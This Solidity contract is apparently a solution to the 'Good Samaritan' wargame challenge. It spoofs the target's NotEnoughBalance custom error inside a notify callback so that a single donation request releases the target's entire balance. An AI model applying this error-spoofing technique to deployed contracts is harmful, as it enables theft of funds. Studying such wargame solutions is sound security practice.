// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/utils/Address.sol";
import "./GoodSamaritan.sol";

contract GoodSamaritan_exp is INotifyable{
    error NotEnoughBalance();
    GoodSamaritan samaritan;
    constructor(address s) {
        samaritan = GoodSamaritan(s);
    }
    function request() external {
        samaritan.requestDonation();
    }

    function notify(uint256 amount) external{
        if(amount == 10){
            revert NotEnoughBalance();
        }
    }


}